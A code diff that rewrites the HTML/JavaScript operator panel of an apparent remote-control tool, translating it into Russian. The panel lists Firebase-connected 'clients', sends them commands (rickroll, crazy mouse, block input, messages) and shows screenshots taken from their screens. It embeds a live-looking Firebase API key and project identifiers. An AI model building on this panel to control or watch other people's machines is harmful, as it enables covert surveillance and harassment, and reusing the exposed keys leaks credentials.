@@ -1,297 +1,118 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Remote Admin Panel</title>
-  <!-- Bootstrap 5 Darkly theme (bootswatch) -->
-  <link href="https://cdn.jsdelivr.net/npm/bootswatch@5.3.0/dist/darkly/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body {
-      background-color: #111;
-      color: #ccc;
-    }
-    .sidebar {
-      background-color: #1a1a1a;
-      border-right: 1px solid #333;
-      min-height: 100vh;
-      padding: 15px;
-    }
-    .client-item {
-      padding: 8px 12px;
-      cursor: pointer;
-      border-radius: 4px;
-      transition: background 0.2s;
-      display: flex;
-      align-items: center;
-      margin-bottom: 4px;
-    }
-    .client-item:hover {
-      background-color: #2a2a2a;
-    }
-    .client-item.active {
-      background-color: #3a3a3a;
-      font-weight: bold;
-    }
-    .status-dot {
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      margin-right: 8px;
-      background: gray;
-    }
-    .status-dot.online {
-      background: #00cc00;
-      box-shadow: 0 0 5px #00cc00;
-    }
-    .status-dot.offline {
-      background: #555;
-    }
-    .btn-danger-big {
-      padding: 1.2rem 2rem;
-      font-size: 1.5rem;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        body { background: #0a0a0a; color: #ccc; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
+        .sidebar { background: #1a1a1a; width: 250px; padding: 1rem; border-right: 1px solid #333; overflow-y: auto; }
+        .client-btn { display: block; width: 100%; margin: 4px 0; padding: 8px 12px; background: #2a2a2a; border: none; color: #ccc; text-align: left; border-radius: 4px; cursor: pointer; }
+        .client-btn:hover { background: #3a3a3a; }
+        .client-btn.active { background: #0b5ed7; color: white; }
+        .main { flex: 1; padding: 1.5rem; }
+        .screenshot { max-width: 100%; border: 1px solid #333; margin: 1rem 0; }
+        button { margin: 4px; }
+    </style>
 </head>
 <body>
-  <div class="container-fluid">
-    <div class="row">
-      <!-- Sidebar client list -->
-      <nav class="col-md-3 col-lg-2 sidebar">
-        <h4 class="text-success mb-3">🖥 Clients</h4>
-        <div id="clientList" class="list-group list-group-flush">
-          <div class="text-muted">Waiting for clients...</div>
-        </div>
-        <div class="mt-3 text-secondary small">
-          <span id="connectionStatus">🔗 Connecting...</span>
-        </div>
-      </nav>
-
-      <!-- Main panel -->
-      <main class="col-md-9 col-lg-10 mt-3">
-        <div id="mainContent">
-          <div class="alert alert-secondary">← Select a client from the left panel</div>
-        </div>
-      </main>
+    <div class="sidebar">
+        <h3>🖥 Клиенты</h3>
+        <div id="clientList">Загрузка...</div>
+        <div id="connectionStatus" style="font-size:0.8em; margin-top:10px;"></div>
     </div>
-  </div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  <!-- Bootstrap JS (for interactive components) -->
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-
-  <script>
-    // ---------- Firebase Config ----------
-    const firebaseConfig = {
-      apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
-      authDomain: "gen-lang-client-0884792103.firebaseapp.com",
-      projectId: "gen-lang-client-0884792103",
-      storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
-      messagingSenderId: "556057210756",
-      appId: "1:556057210756:web:45677d6e28066be811f7d1",
-      databaseURL: "https://gen-lang-client-0884792103-default-rtdb.firebaseio.com/"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // ---------- State ----------
-    let currentTarget = null;                // selected client ID
-    const clientData = {};                   // id -> { last_seen: timestamp, ... }
-    const clientElements = {};               // id -> DOM li element
-    const statusDots = {};                   // id -> DOM dot element
-
-    // ---------- Helper: update status dot based on last_seen ----------
-    function updateStatusDot(clientId) {
-      const dot = statusDots[clientId];
-      if (!dot) return;
-      const data = clientData[clientId];
-      if (!data || !data.last_seen) {
-        dot.className = 'status-dot offline';
-        return;
-      }
-      const now = Date.now();
-      const diff = now - data.last_seen;
-      if (diff < 60000) { // 1 minute
-        dot.className = 'status-dot online';
-      } else {
-        dot.className = 'status-dot offline';
-      }
-    }
-
-    // Periodic status check every 2 seconds
-    setInterval(() => {
-      Object.keys(clientData).forEach(id => updateStatusDot(id));
-    }, 2000);
-
-    // ---------- Firebase listeners for clients ----------
-    const clientsRef = db.ref('clients');
-
-    clientsRef.on('child_added', (snap) => {
-      const clientId = snap.key;
-      const val = snap.val() || {};
-      // Store data
-      clientData[clientId] = {
-        last_seen: val.last_seen || null,
-        // other fields can be stored if needed
-      };
-      // Create UI element
-      addClientToList(clientId);
-    });
-
-    clientsRef.on('child_changed', (snap) => {
-      const clientId = snap.key;
-      const val = snap.val() || {};
-      if (clientData[clientId]) {
-        clientData[clientId].last_seen = val.last_seen;
-        updateStatusDot(clientId);
-      }
-    });
-
-    clientsRef.on('child_removed', (snap) => {
-      const clientId = snap.key;
-      removeClientFromList(clientId);
-      delete clientData[clientId];
-      if (currentTarget === clientId) {
-        currentTarget = null;
-        renderMainPanel();
-      }
-    });
-
-    // ---------- UI functions ----------
-    function addClientToList(clientId) {
-      const list = document.getElementById('clientList');
-      // Remove placeholder if present
-      if (list.querySelector('.text-muted')) list.innerHTML = '';
-
-      const item = document.createElement('div');
-      item.className = 'client-item';
-      item.dataset.clientId = clientId;
-      item.innerHTML = `
-        <span class="status-dot offline" id="dot-${clientId}"></span>
-        <span>${clientId}</span>
-      `;
-      item.addEventListener('click', () => selectClient(clientId));
-      list.appendChild(item);
-      clientElements[clientId] = item;
-      statusDots[clientId] = item.querySelector('.status-dot');
-      // initial update
-      updateStatusDot(clientId);
-    }
-
-    function removeClientFromList(clientId) {
-      const item = clientElements[clientId];
-      if (item) item.remove();
-      delete clientElements[clientId];
-      delete statusDots[clientId];
-    }
-
-    function selectClient(clientId) {
-      // Deactivate previous
-      if (currentTarget && clientElements[currentTarget]) {
-        clientElements[currentTarget].classList.remove('active');
-      }
-      currentTarget = clientId;
-      if (clientElements[currentTarget]) {
-        clientElements[currentTarget].classList.add('active');
-      }
-      renderMainPanel();
-    }
-
-    // ---------- Main panel rendering ----------
-    function renderMainPanel() {
-      const main = document.getElementById('mainContent');
-      if (!currentTarget) {
-        main.innerHTML = '<div class="alert alert-secondary">← Select a client from the left panel</div>';
-        return;
-      }
-
-      main.innerHTML = `
-        <div class="card bg-dark border-secondary mb-3">
-          <div class="card-header bg-dark border-secondary">
-            <h4 class="text-success">🖥 Managing: ${currentTarget}</h4>
-          </div>
-          <div class="card-body">
-            <!-- Big red screenshot button -->
-            <button class="btn btn-danger btn-lg w-100 btn-danger-big mb-3" onclick="requestScreenshot()">
-              📸 ОБНОВИТЬ СКРИНШОТ
-            </button>
-
-            <!-- Other command buttons -->
-            <div class="row g-2">
-              <div class="col-6">
-                <button class="btn btn-outline-warning w-100" onclick="sendCommand('rickroll')">🎵 Rickroll</button>
-              </div>
-              <div class="col-6">
-                <button class="btn btn-outline-warning w-100" onclick="sendCommand('crazy_mouse')">🐭 Crazy Mouse</button>
-              </div>
-              <div class="col-6">
-                <button class="btn btn-outline-warning w-100" onclick="sendCommand('block_input')">🔒 Block Input</button>
-              </div>
-              <div class="col-6">
-                <button class="btn btn-outline-warning w-100" onclick="sendCommand('screenshot')">📷 Screenshot</button>
-              </div>
-            </div>
-
-            <!-- Message section -->
-            <div class="mt-3">
-              <label class="form-label">Message to client</label>
-              <div class="input-group">
-                <input type="text" id="msgPayload" class="form-control" placeholder="Enter message...">
-                <button class="btn btn-outline-primary" onclick="sendMessage()">Send</button>
-              </div>
-            </div>
-          </div>
+    <div class="main">
+        <h2 id="selectedClient">Выберите клиента</h2>
+        <img id="screenshotImg" class="screenshot" style="display:none;" alt="Скриншот">
+        <div id="controls" style="display:none;">
+            <button onclick="sendCommand('rickroll')">🎵 Rickroll</button>
+            <button onclick="sendCommand('msg')">💬 Сообщение</button>
+            <button onclick="sendCommand('screenshot')">📸 Обновить скриншот</button>
         </div>
-      `;
-    }
+    </div>
 
-    // ---------- Command functions ----------
-    function sendCommand(cmd) {
-      if (!currentTarget) {
-        alert('No client selected');
-        return;
-      }
-      db.ref(`clients/${currentTarget}/command`).set(cmd);
-    }
+    <!-- Модульный Firebase SDK 9+ -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, onValue, set, off } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
-    function sendMessage() {
-      if (!currentTarget) {
-        alert('No client selected');
-        return;
-      }
-      const input = document.getElementById('msgPayload');
-      const text = input.value.trim();
-      if (!text) return;
-      // Set payload then command
-      db.ref(`clients/${currentTarget}/payload`).set(text)
-        .then(() => db.ref(`clients/${currentTarget}/command`).set('msg'))
-        .then(() => input.value = '')
-        .catch(err => console.error(err));
-    }
+        const firebaseConfig = {
+            apiKey: "AIzaSyAAb2d_IOCpDO_niqfkjfWddhpZo0yaDOM",
+            authDomain: "gen-lang-client-0884792103.firebaseapp.com",
+            databaseURL: "https://gen-lang-client-0884792103-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "gen-lang-client-0884792103",
+            storageBucket: "gen-lang-client-0884792103.firebasestorage.app",
+            messagingSenderId: "556057210756",
+            appId: "1:556057210756:web:45677d6e28066be811f7d1"
+        };
 
-    function requestScreenshot() {
-      if (!currentTarget) {
-        alert('No client selected');
-        return;
-      }
-      // Set the get_screen flag to true
-      db.ref(`clients/${currentTarget}/get_screen`).set(true);
-    }
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-    // Connection status
-    db.ref('.info/connected').on('value', (snap) => {
-      const el = document.getElementById('connectionStatus');
-      if (snap.val() === true) {
-        el.innerHTML = '🟢 Connected';
-      } else {
-        el.innerHTML = '🔴 Disconnected';
-      }
-    });
-  </script>
+        let currentClient = null;
+        let screenListener = null;
+
+        // Подключение к списку клиентов
+        const clientsRef = ref(db, 'clients');
+        onValue(clientsRef, (snapshot) => {
+            const data = snapshot.val();
+            const listDiv = document.getElementById('clientList');
+            listDiv.innerHTML = '';
+            if (!data) {
+                listDiv.innerHTML = 'Нет клиентов';
+                return;
+            }
+            Object.keys(data).forEach(clientId => {
+                const btn = document.createElement('button');
+                btn.className = 'client-btn';
+                btn.textContent = clientId;
+                btn.onclick = () => selectClient(clientId);
+                listDiv.appendChild(btn);
+            });
+        });
+
+        // Статус соединения
+        const connectedRef = ref(db, '.info/connected');
+        onValue(connectedRef, (snap) => {
+            const el = document.getElementById('connectionStatus');
+            el.textContent = snap.val() ? '🟢 Подключено' : '🔴 Отключено';
+        });
+
+        // Выбор клиента
+        function selectClient(clientId) {
+            // Убираем предыдущий активный класс
+            if (currentClient) {
+                const oldBtn = document.querySelector(`.client-btn.active`);
+                if (oldBtn) oldBtn.classList.remove('active');
+            }
+            currentClient = clientId;
+            // Подсвечиваем новую кнопку
+            const btns = document.querySelectorAll('.client-btn');
+            btns.forEach(b => {
+                if (b.textContent === clientId) b.classList.add('active');
+            });
+            document.getElementById('selectedClient').textContent = `Управление: ${clientId}`;
+            document.getElementById('controls').style.display = 'block';
+            // Подписываемся на скриншот
+            if (screenListener) off(screenListener);
+            const screenRef = ref(db, `clients/${clientId}/screenshot`);
+            screenListener = onValue(screenRef, (snap) => {
+                const base64 = snap.val();
+                const img = document.getElementById('screenshotImg');
+                if (base64) {
+                    img.src = `data:image/jpeg;base64,${base64}`;
+                    img.style.display = 'block';
+                } else {
+                    img.style.display = 'none';
+                }
+            });
+        }
+
+        // Отправка команды
+        window.sendCommand = function(cmd) {
+            if (!currentClient) return alert('Сначала выберите клиента!');
+            set(ref(db, `clients/${currentClient}/command`), cmd);
+        };
+    </script>
 </body>
 </html>
